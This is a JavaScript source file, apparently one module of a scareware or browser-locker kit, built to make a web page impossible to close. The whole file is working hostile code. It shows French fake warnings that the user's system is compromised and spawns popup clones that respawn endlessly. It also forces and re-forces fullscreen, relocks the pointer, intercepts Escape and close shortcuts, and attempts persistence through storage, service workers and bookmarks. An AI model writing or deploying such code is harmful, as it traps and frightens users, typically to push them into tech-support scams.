/**
 * 24. IMPOSSIBLE TO CLOSE - MAXIMUM AGGRESSION
 * beforeunload loops, clone windows, browser restart persistence, tab resurrection
 */
const ImpossibleToClose = {
    clones: [],
    init: function() {
        this.beforeUnloadLoop();
        this.unloadResurrection();
        this.spawnClones();
        this.browserRestartPersistence();
        this.closeBlocker();
    },
    beforeUnloadLoop: function() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '⚠️ ATTENTION: Votre système est compromis! Fermer cette page peut causer des dommages permanents à vos données.';
            return e.returnValue;
        });
        const setBeforeUnload = (win) => {
            try {
                win.addEventListener('beforeunload', (e) => {
                    e.preventDefault();
                    e.returnValue = '⚠️ ATTENTION: Fermer cette page peut causer des dommages permanents!';
                    return e.returnValue;
                });
            } catch(ex) {}
        };
        this.clones.forEach(setBeforeUnload);
    },
    unloadResurrection: function() {
        window.addEventListener('unload', () => {
            try { window.open(window.location.href, '_blank', 'noopener,noreferrer'); } catch(e) {}
            try { window.location.href = window.location.href; } catch(e) {}
        });
    },
    spawnClones: function() {
        const spawnClone = () => {
            try {
                const clone = window.open(
                    window.location.href, '_blank',
                    'width=' + window.innerWidth + ',height=' + window.innerHeight + ',toolbar=no,menubar=no,scrollbars=no,resizable=yes,location=no,status=no'
                );
                if (clone) {
                    this.clones.push(clone);
                    try {
                        clone.addEventListener('beforeunload', () => {
                            try { window.open(window.location.href, '_blank'); } catch(e) {}
                        });
                    } catch(e) {}
                }
            } catch(e) {}
        };
        for (let i = 0; i < 3; i++) setTimeout(spawnClone, i * 500);
        setInterval(() => {
            this.clones = this.clones.filter(c => { try { return !c.closed; } catch(e) { return false; } });
            while (this.clones.length < 3) spawnClone();
        }, 2000);
        document.addEventListener('click', () => { for (let i = 0; i < 2; i++) spawnClone(); });
    },
    browserRestartPersistence: function() {
        try {
            localStorage.setItem('fs17_persistence', JSON.stringify({
                url: window.location.href, timestamp: Date.now(), userAgent: navigator.userAgent
            }));
        } catch(e) {}
        try {
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.ready.then((reg) => {
                    try { reg.sync.register('fs17-resurrect'); } catch(e) {}
                });
            }
        } catch(e) {}
        try {
            if (window.sidebar && window.sidebar.addPanel) window.sidebar.addPanel('⚠️ Alerte Sécurité', window.location.href, '');
            if (window.external && window.external.AddFavorite) window.external.AddFavorite(window.location.href, '⚠️ Alerte Sécurité');
        } catch(e) {}
    },
    closeBlocker: function() {
        // Go fullscreen on first interaction
        const goFullscreen = () => {
            try {
                const el = document.documentElement;
                if (el.requestFullscreen) el.requestFullscreen();
                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
                else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
                else if (el.msRequestFullscreen) el.msRequestFullscreen();
            } catch(e) {}
        };
        document.addEventListener('click', goFullscreen, { once: true });
        document.addEventListener('keydown', goFullscreen, { once: true });

        // Detect when fullscreen is exited (Escape) and IMMEDIATELY re-enter + spawn clones
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                // User pressed Escape — re-enter fullscreen and spawn clones
                setTimeout(goFullscreen, 50);
                setTimeout(goFullscreen, 200);
                setTimeout(goFullscreen, 500);
                for (let i = 0; i < 3; i++) {
                    try { window.open(window.location.href, '_blank'); } catch(e) {}
                }
            }
        });
        // Also detect webkit/moz/ms fullscreen changes
        ['webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(evt => {
            document.addEventListener(evt, () => {
                if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
                    setTimeout(goFullscreen, 50);
                    setTimeout(goFullscreen, 200);
                    for (let i = 0; i < 3; i++) {
                        try { window.open(window.location.href, '_blank'); } catch(e) {}
                    }
                }
            });
        });

        // Detect pointer lock release (also triggered by Escape)
        document.addEventListener('pointerlockchange', () => {
            if (!document.pointerLockElement) {
                // Re-lock pointer
                try { document.body.requestPointerLock(); } catch(e) {}
                // Spawn clones
                for (let i = 0; i < 2; i++) {
                    try { window.open(window.location.href, '_blank'); } catch(e) {}
                }
            }
        });

        // Block Escape, Ctrl+W, etc at keydown level
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'w') {
                e.preventDefault(); e.stopPropagation();
                try { window.open(window.location.href, '_blank'); } catch(ex) {}
                return false;
            }
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'W' || e.key === 'w')) {
                e.preventDefault(); e.stopPropagation();
                try { window.open(window.location.href, '_blank'); } catch(ex) {}
                return false;
            }
            if ((e.ctrlKey || e.metaKey) && e.key === 'F4') { e.preventDefault(); e.stopPropagation(); return false; }
            if (e.key === 'Escape') {
                e.preventDefault(); e.stopPropagation();
                // Re-enter fullscreen immediately
                goFullscreen();
                // Spawn clones
                for (let i = 0; i < 2; i++) {
                    try { window.open(window.location.href, '_blank'); } catch(ex) {}
                }
                return false;
            }
        }, true);
        document.addEventListener('keyup', (e) => {
            if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'W')) { e.preventDefault(); return false; }
            if (e.key === 'Escape') { e.preventDefault(); goFullscreen(); return false; }
        }, true);
    }
};